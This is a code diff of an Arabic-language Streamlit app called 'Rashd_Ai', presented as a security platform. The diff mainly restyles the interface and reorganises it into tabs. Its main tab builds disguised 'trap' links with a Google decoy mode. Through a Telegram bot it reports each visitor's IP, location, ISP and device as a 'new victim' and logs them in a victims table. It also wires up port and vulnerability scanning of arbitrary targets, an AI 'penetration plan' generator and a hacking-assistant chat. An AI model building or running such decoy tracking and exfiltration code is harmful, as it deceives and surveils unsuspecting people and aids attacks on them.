@@ -38,36 +38,64 @@ except ImportError as e:
 # إعدادات الصفحة
 st.set_page_config(page_title="Rashd_Ai - CyberShield Pro", page_icon="🛡️", layout="wide")
 
-# تصميم الواجهة الاحترافية (CSS)
+# تصميم الواجهة المطابق للصورة (CSS)
 st.markdown("""
     <style>
     .main { background-color: #0e1117; }
-    .stButton>button {
-        width: 100%;
-        border-radius: 5px;
-        height: 3em;
-        background-color: #262730;
-        color: white;
-        border: 1px solid #4b4b4b;
+    
+    /* تنسيق العنوان الكبير كما في الصورة */
+    .main-title {
+        font-size: 60px !important;
+        font-weight: 800 !important;
+        color: white !important;
+        margin-bottom: 0px !important;
+        padding-bottom: 0px !important;
     }
-    .stButton>button:hover { background-color: #ff4b4b; border: 1px solid #ff4b4b; }
+    .sub-title {
+        font-size: 40px !important;
+        color: white !important;
+        margin-top: -20px !important;
+    }
+    
+    /* تنسيق التبويبات (Tabs) لتطابق الصورة */
+    .stTabs [data-baseweb="tab-list"] {
+        gap: 20px;
+        border-bottom: 2px solid #333;
+    }
+    .stTabs [data-baseweb="tab"] {
+        height: 60px;
+        background-color: transparent !important;
+        border: none !important;
+        color: white !important;
+        font-size: 20px !important;
+        font-weight: 600 !important;
+    }
+    .stTabs [aria-selected="true"] {
+        border-bottom: 4px solid #ff4b4b !important;
+        color: #ff4b4b !important;
+    }
+    
+    /* إخفاء واجهة Streamlit */
     #MainMenu {visibility: hidden;}
     footer {visibility: hidden;}
     header {visibility: hidden;}
     .stApp [data-testid="stToolbar"] {display: none;}
-    /* تحسين شكل التبويبات */
-    .stTabs [data-baseweb="tab-list"] {
-        gap: 10px;
-    }
-    .stTabs [data-baseweb="tab"] {
-        height: 50px;
-        white-space: pre-wrap;
+    
+    /* تنسيق الأزرار */
+    .stButton>button {
+        width: 100%;
+        border-radius: 8px;
+        height: 3.5em;
         background-color: #1e293b;
-        border-radius: 5px 5px 0px 0px;
         color: white;
+        border: 1px solid #334155;
+        font-weight: bold;
     }
-    .stTabs [aria-selected="true"] {
-        background-color: #ff4b4b !important;
+    .stButton>button:hover {
+        background-color: #ff4b4b;
+        border: 1px solid #ff4b4b;
+        transform: translateY(-2px);
+        transition: 0.3s;
     }
     </style>
     """, unsafe_allow_html=True)
@@ -94,9 +122,10 @@ def send_telegram_alert(ip, trap_name, device="Unknown"):
             geo_data = {"country": res.get("country"), "city": res.get("city"), "isp": res.get("isp")}
     except: pass
     msg = f"🎯 تنبيه: ضحية جديدة!\n📍 IP: {ip}\n🌍 {geo_data['country']} - {geo_data['city']}\n🏢 {geo_data['isp']}\n📱 {device}\n🎯 {trap_name}"
-    try: requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": msg})
+    try: 
+        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": msg})
+        victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)
     except: pass
-    victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)
 
 # وضع التمويه
 query_params = st.query_params
@@ -154,34 +183,94 @@ with st.sidebar:
         st.rerun()
         
     st.markdown("---")
-    if st.button("Logout"):
+    if st.button("🚪 Logout"):
         st.session_state.authenticated = False
         st.rerun()
 
-# الواجهة الرئيسية باستخدام التبويبات (Tabs)
-st.header("🛡️ Rashd_Ai Security Platform")
+# الواجهة الرئيسية (مطابقة للصورة)
+st.markdown('<p class="sub-title">لوحة تحكم</p>', unsafe_allow_html=True)
+st.markdown('<p class="main-title">Rashd_Ai 🔗</p>', unsafe_allow_html=True)
 
+# التبويبات بأسماء وأيقونات مطابقة للصورة
 tabs = st.tabs([
-    "📊 Dashboard", 
-    "🔍 OSINT", 
-    "🛡️ Security", 
-    "🧠 AI Tools", 
-    "🎯 Traps", 
-    "⚙️ Settings"
+    "🎯 المصيدة", 
+    "📄 التقارير", 
+    "💡 الخطة", 
+    "🚨 التهديدات", 
+    "🌐 الشبكة",
+    "🧠 المساعد الذكي"
 ])
 
-# 1. Dashboard
+# 1. المصيدة (Dashboard & Traps)
 with tabs[0]:
     victims = victim_logger.get_all_victims()
     c1, c2, c3 = st.columns(3)
-    c1.metric("Victims", len(victims))
-    c2.metric("Tools", "18")
-    c3.metric("Status", "Online ✅")
+    c1.metric("إجمالي الضحايا", len(victims))
+    c2.metric("أدوات نشطة", "18")
+    c3.metric("حالة النظام", "Online ✅")
     
-    st.subheader("💬 Rashd_Ai Assistant")
+    st.subheader("🎯 نظام المصيدة والتمويه")
+    tid = st.text_input("اسم المصيدة", value="Google_Trap")
+    st.code(f"https://rashdai.streamlit.app/?decoy=google&trap={tid}")
+    
+    st.subheader("📊 سجل الضحايا الأخير")
+    if victims: st.table(victims[:10])
+    else: st.info("لا يوجد ضحايا مسجلين بعد.")
+
+# 2. التقارير
+with tabs[1]:
+    st.header("📄 توليد التقارير الأمنية")
+    if st.button("توليد تقرير PDF شامل"):
+        try:
+            path = report_generator.generate_full_report()
+            if path:
+                with open(path, "rb") as f:
+                    st.download_button("تحميل التقرير", f, file_name="Security_Report.pdf")
+        except: st.error("الأداة غير متوفرة حالياً")
+
+# 3. الخطة
+with tabs[2]:
+    st.header("💡 خطة الاختراق والتحصين")
+    target = st.text_input("أدخل الهدف لتوليد الخطة")
+    if st.button("توليد الخطة الذكية"):
+        try: st.write(ai_pentest.generate_plan(target))
+        except: st.error("خطأ في توليد الخطة")
+
+# 4. التهديدات
+with tabs[3]:
+    st.header("🚨 تحليل التهديدات السيبرانية")
+    threat_data = st.text_area("أدخل بيانات التهديد للتحليل")
+    if st.button("بدء تحليل التهديد"):
+        try: st.write(ai_threat.analyze(threat_data))
+        except: st.error("خطأ في التحليل")
+
+# 5. الشبكة
+with tabs[4]:
+    st.header("🌐 فحص الشبكة والمنافذ")
+    net_tabs = st.tabs(["🔌 فحص منافذ", "🗺 خريطة شبكة", "⚠️ فحص ثغرات"])
+    with net_tabs[0]:
+        ip = st.text_input("IP للفحص")
+        if st.button("بدء فحص المنافذ"):
+            try: st.write(port_scanner.scan(ip))
+            except: st.error("خطأ في الفحص")
+    with net_tabs[1]:
+        ip_map = st.text_input("IP لرسم الخريطة")
+        if st.button("رسم الخريطة"):
+            try:
+                path = network_mapper.map_network(ip_map)
+                if path: st.image(path)
+            except: st.error("خطأ في الرسم")
+    with net_tabs[2]:
+        ip_vuln = st.text_input("الهدف لفحص الثغرات")
+        if st.button("فحص الثغرات"):
+            try: st.write(vuln_scanner.scan(ip_vuln))
+            except: st.error("خطأ في الفحص")
+
+# 6. المساعد الذكي (Chat)
+with tabs[5]:
+    st.header("🧠 مساعد Rashd_Ai الذكي")
     if "messages" not in st.session_state: st.session_state.messages = []
     
-    # حاوية ثابتة الارتفاع للمحادثة
     with st.container(height=400):
         for msg in st.session_state.messages:
             with st.chat_message(msg["role"]):
@@ -192,80 +281,10 @@ with tabs[0]:
         with st.chat_message("user"): st.markdown(prompt)
         with st.chat_message("assistant"):
             try:
-                # محاولة الاتصال بالذكاء الاصطناعي مع معالجة الخطأ
                 assistant = AIHackingAssistant()
                 response = assistant.chat(prompt)
             except Exception as e:
-                response = f"❌ خطأ في الاتصال بالذكاء الاصطناعي: {str(e)}"
+                response = f"❌ خطأ في الاتصال: {str(e)}"
             st.markdown(response)
         st.session_state.messages.append({"role": "assistant", "content": response})
         st.rerun()
-
-    st.subheader("🎯 Recent Victims")
-    if victims: st.table(victims[:5])
-
-# 2. OSINT
-with tabs[1]:
-    st.header("🔍 OSINT Tools")
-    o_tabs = st.tabs(["🌐 Domain", "👤 User", "📧 Email", "📱 Phone"])
-    with o_tabs[0]:
-        d = st.text_input("Domain")
-        if st.button("Scan Domain"):
-            try: st.write(domain_osint.whois_lookup(d))
-            except: st.error("Error")
-    with o_tabs[1]:
-        u = st.text_input("User")
-        if st.button("Search User"):
-            try: st.write(username_osint.username_search(u))
-            except: st.error("Error")
-    with o_tabs[2]:
-        e = st.text_input("Email")
-        if st.button("Search Email"):
-            try: st.write(email_osint.search_email(e))
-            except: st.error("Error")
-    with o_tabs[3]:
-        p = st.text_input("Phone")
-        if st.button("Lookup Phone"):
-            try: st.write(phone_osint.lookup(p))
-            except: st.error("Error")
-
-# 3. Security
-with tabs[2]:
-    st.header("🛡️ Security Tools")
-    s_tabs = st.tabs(["🔍 Web", "🔌 Ports", "⚠️ Vulns"])
-    with s_tabs[0]:
-        u = st.text_input("URL")
-        if st.button("Scan Web"):
-            try: st.write(website_scan.detect_tech(u))
-            except: st.error("Error")
-    with s_tabs[1]:
-        i = st.text_input("IP")
-        if st.button("Scan Ports"):
-            try: st.write(port_scanner.scan(i))
-            except: st.error("Error")
-    with s_tabs[2]:
-        i = st.text_input("Target")
-        if st.button("Scan Vulns"):
-            try: st.write(vuln_scanner.scan(i))
-            except: st.error("Error")
-
-# 4. AI Tools
-with tabs[3]:
-    st.header("🧠 AI Security")
-    data = st.text_area("Data")
-    if st.button("Analyze"):
-        try: st.write(ai_analysis.analyze_data(data))
-        except: st.error("Error")
-
-# 5. Traps
-with tabs[4]:
-    st.header("🎯 Traps")
-    tid = st.text_input("Trap ID", value="Google_Trap")
-    st.code(f"https://rashdai.streamlit.app/?decoy=google&trap={tid}")
-    if st.button("Refresh"): st.table(victim_logger.get_all_victims())
-
-# 6. Settings
-with tabs[5]:
-    st.header("⚙️ Settings")
-    st.success("API Keys Active.")
-    st.info("Version: 3.2.0 (Tabs & Sidebar Keys Edition)")
